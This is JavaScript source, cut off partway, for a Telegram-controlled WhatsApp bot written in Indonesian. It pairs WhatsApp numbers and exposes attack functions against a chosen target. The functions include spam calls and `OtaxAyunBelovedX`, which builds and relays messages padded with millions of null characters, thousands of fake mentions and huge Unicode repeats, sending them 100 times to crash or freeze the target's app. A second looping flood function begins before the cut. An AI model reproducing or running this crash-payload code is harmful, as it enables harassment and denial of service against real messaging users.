const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  aretargetsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  targetDecode,
  mentionedtarget,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("@farisme/farisbaileys");
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync("./assets/images/thumb.jpeg");
const FormData = require('form-data');
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./premium.json");
ensureFileExists("./admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`bot ${botNum}:`, error);
      }
    }
  });
}

watchFile("./premium.json", (data) => (premiumUsers = data));
watchFile("./admin.json", (data) => (adminUsers = data));

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/rezzxaay-byte/Database/main/tokens.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }

  console.log(chalk.green(` JANGAN LUPA MASUK GB INFO SCRIPT⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.setMyCommands([
  { command: '/start', description: 'Developer Tercinta Sanzope' }
]).then(() => {
    console.log('Daftar perintah berhasil diperbarui!');
}).catch((error) => {
    console.error('Gagal memperbarui perintah:', error);
});

function startBot() {
  console.log(chalk.red(`
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⣠⠾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢦⠀
⢰⠇⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠈⣧
⠘⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⣿
⠀⡇⠘⡄⢱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡆⢀⡏
⠀⠹⣄⠹⡀⠙⣄⠀⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣾⣶⣶⣶⣶⣤⣀⠀⠀⠀⠀⠀⢀⠜⠁⡜⢀⡞⠀
⠀⠀⠘⣆⢣⡄⠈⢣⡀⢀⣤⣾⣿⣿⢿⠉⠉⠉⠉⠉⠉⠉⣻⢿⣿⣷⣦⣄⠀⡰⠋⢀⣾⢡⠞⠀⠀
⠀⠀⠀⠸⣿⡿⡄⡀⠉⠙⣿⡿⠁⠈⢧⠃⠀⠀⠀⠀⠀⠀⢷⠋⠀⢹⣿⠛⠉⢀⠄⣞⣧⡏⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣹⠘⡆⠀⡿⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⡆⢀⡎⣼⣽⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣹⣿⣇⠹⣼⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣳⡜⢰⣿⣟⡀⠀⠀⠀⠀
⠀⠀⠀⠀⡾⡉⠛⣿⠴⠳⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠳⢾⠟⠉⢻⡀⠀⠀⠀
⠀⠀⠀⠀⣿⢹⠀⢘⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⡏⠀⡼⣾⠇⠀⠀⠀
⠀⠀⠀⠀⢹⣼⠀⣾⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⡀⢹⠀⢳⣼⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣇⠀⠸⣾⠁⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠰⣄⠀⠀⠀⠀⠀⠀⣹⡞⠀⣀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣇⠱⡄⢸⡛⠒⠒⠒⠒⠚⢿⣇⠀⠀⠀⢠⣿⠟⠒⠒⠒⠒⠚⡿⢀⡞⢹⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡞⢰⣷⠀⠑⢦⣄⣀⣀⣠⠞⢹⠀⠀⠀⣸⠙⣤⣀⣀⣀⡤⠞⠁⢸⣶⢸⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣧⣰⠿⣄⠀⠀⠀⢀⣈⡉⠙⠏⠀⠀⠀⠘⠛⠉⣉⣀⠀⠀⠀⢀⡟⣿⣼⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡿⠀⠘⠷⠤⠾⢻⠞⠋⠀⠀⠀⠀⠀⠀⠀⠘⠛⣎⠻⠦⠴⠋⠀⠹⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡀⢀⠀⠀⡰⡌⠻⠷⣤⡀⠀⠀⠀⠀⣠⣶⠟⠋⡽⡔⠀⡀⠀⣰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⡳⡀⢣⣿⣀⣷⠈⠳⣦⣀⣠⡾⠋⣸⡇⣼⣷⠁⡴⢁⣴⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⡷⡜⣿⣻⠈⣦⣀⣀⠉⠀⣀⣠⡏⢹⣿⣏⡼⣡⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣻⡄⠹⡙⠛⠿⠟⠛⡽⠀⣿⣻⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡏⢏⢿⡀⣹⢲⣶⡶⢺⡀⣴⢫⢃⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠈⠷⠭⠽⠛⠛⠛⠋⠭⠴⠋⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⡀⢀⣀⣠⣀⣀⢀⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀

`));


console.log(chalk.greenBright(`
┌─────────────────────────────┐
│ ⚠️ inicialização em execução com sucesso  
├─────────────────────────────┤
│ DESENVOLVEDOR : Gabreil 
│ TELEGRAMA : @GabreilRey
│ CHANEL : https://t.me/myisbald 
└─────────────────────────────┘
`));

console.log(chalk.blueBright(`
[ LU SEMUA ⚔️ KACUNG ]
`
));
};

/*validateToken(); 
buat validate token kalo lu mau kasih db nya*/
validateToken();
// buat start tanpa db kalo mau stary tanpa db tinggal ubah jadi startBot
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sock.newsletterFollow("120363301087120650@newsletter");
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`◇ 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 ${botNumber}..... 𝙨𝙪𝙘𝙘𝙚𝙨\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
      sock.newsletterFollow("120363301087120650@newsletter");
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`◇ 𝙎𝙪𝙘𝙘𝙚𝙨 𝙥𝙧𝙤𝙨𝙚𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜\`\`\`
𝙔𝙤𝙪𝙧 𝙘𝙤𝙙𝙚 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


// -------( Fungsional Function Before Parameters )--------- \\
// ~SEMANGAT RENAME NYA BY SANZOPE

// NGAPA IN SIH?? 🥱
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari,${hours} Jam,${minutes} Menit`
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~AMBIL SPEED AJA GUNA GK GUNA AMPOS
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}

// BUAT TANGGAL TANGGALAN
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

function getRandomImage() {
  const images = [
    "https://files.catbox.moe/4arlxn.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// CD DI SINI YA MEK

let cooldownData = fs.existsSync(cd)
  ? JSON.parse(fs.readFileSync(cd))
  : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime =
      cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}

function escapeHTML(text) {
  return text.replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
  if (!link.includes("https://whatsapp.com/channel/"))
    return { error: "Link tidak valid!" };

  let channelId = link.split("https://whatsapp.com/channel/")[1];
  try {
    let res = await sock.newsletterMetadata("invite", channelId);
    return {
      id: res.id,
      name: res.name,
      subscribers: res.subscribers,
      status: res.state,
      verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak",
    };
  } catch (err) {
    return { error: "Gagal mengambil data! Pastikan channel valid." };
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
async function spamcall(target) {
  // Inisialisasi koneksi dengan makeWASocket
  const sock = makeWASocket({
    printQRInTerminal: false, // QR code tidak perlu ditampilkan
  });

  try {
    console.log(`📞 Mengirim panggilan ke ${target}`);

    // Kirim permintaan panggilan
    await sock.query({
      tag: "call",
      json: ["action", "call", "call", { id: `${target}` }],
    });

    console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
  } catch (err) {
    console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
  } finally {
    sock.ev.removeAllListeners(); // Hapus semua event listener
    sock.ws.close(); // Tutup koneksi WebSocket
  }
}

async function sendOfferCall(target) {
  try {
    await sock.offerCall(target);
    console.log(chalk.white.bold(`Success Send Offer Call To Target`));
  } catch (error) {
    console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
  }
}

async function sendOfferVideoCall(target) {
  try {
    await sock.offerCall(target, {
      video: true,
    });
    console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
  } catch (error) {
    console.error(
      chalk.white.bold(`Failed Send Offer Video Call To Target:`, error)
    );
  }
}
//-------------------------------------------AWAL FUNCTION------------------------------------------\\
async function OtaxAyunBelovedX(sock, target) {

  let biji2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " ¿Otax Here¿ ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"Otax?\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\x10".repeat(1000000)}\"}}`,
          version: 3
        },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );
 
  const mediaData = [
    {
      ID: "68917910",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884987",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ]

  let sequentialIndex = 0
  console.log(chalk.red(`𝘰𝘵𝘢𝘹 𝘴𝘦𝘥𝘢𝘯𝘨 𝘮𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘢𝘵𝘵𝘢𝘤𝘬 𝘬𝘦 ${target}`))

  const selectedMedia = mediaData[sequentialIndex]
  sequentialIndex = (sequentialIndex + 1) % mediaData.length
  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
    ],
  }

  
  const audioMsg = {
    viewOnceMessage: {
      message: {
        audioMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
          mimetype: "audio/mpeg",
          fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
          ]),
          fileLength: 432722,
          seconds: 26,
          ptt: false,
          mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
          ]),
          fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
          ]),
          directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
          mediaKeyTimestamp: 1746275400,
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true
          }
        }
      }
    }
  }

  const textMsg = {
    extendedTextMessage: {
      text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(50000) + "\n\nJust OTAX" + "\0".repeat(100),
      matchedText: "https://t.me/Otapengenkawin",
      description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
      title: "ꦽ".repeat(20000),
      previewType: 6,
      jpegThumbnail:
        "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
      paymentLinkMetadata: {
        button: { displayText: "Love U My Ayun" },
        header: { headerType: 1 },
        provider: { paramsJson: "{".repeat(10000) }
      },
      contextInfo: {
        isForwarded: true,
        forwardingScore: 9999,
        participant: target,
        remoteJid: "status@broadcast",
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
        ],
        quotedMessage: {
          newsletterAdminInviteMessage: {
            newsletterJid: "otax@newsletter",
            newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
            caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
            inviteExpiration: "999999999"
          }
        },
        forwardedNewsletterMessageInfo: {
          newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
          newsletterJid: "13135550002@newsletter",
          serverId: 1
        }
      }
    }
  }

  const interMsg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }
const interMsg2 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }
  
  const statusMessages = [audioMsg, textMsg, interMsg, interMsg2]
 
  let msg = null;
  for (let i = 0; i < 100; i++) {
    await sock.relayMessage("status@broadcast", biji2.message, {
      messageId: biji2.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });  
     for (const content of statusMessages) {
     msg = generateWAMessageFromContent(target, content, {})
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
              },
            ],
          },
        ],
      })
    }
if (i < 99) {
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
  }
  if (mention && msg?.key) {
  await sock.relayMessage(
    target,
    {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25,
          },
        },
      },
    },
    {
      additionalNodes: [
        {
          tag: "meta",
          attrs: {
            is_status_mention: " meki - melar ",
          },
        },
      ],
    }
  );
}
}

async function noctradelayHardV6(target) {
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
  await sock.relayMessage(
    target,
    {
  groupStatusMessageV2: { 
    message: {
      interactiveResponseMessage: {
        body: {
          text: "MakLuu",
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"+9999999999\",\"building_name\":\"ampos\",\"address\":\"/MakLo\",\"tower_number\":\"987\",\"city\":\"MakLo\",\"name\":\"CRB\",\"phone_number\":\"+888888888888\",\"house_number\":\"99\",\"floor_number\":\"99\",\"state\":\"${"\u0000".repeat(5000)}\"}}`,
          version: 3
        },
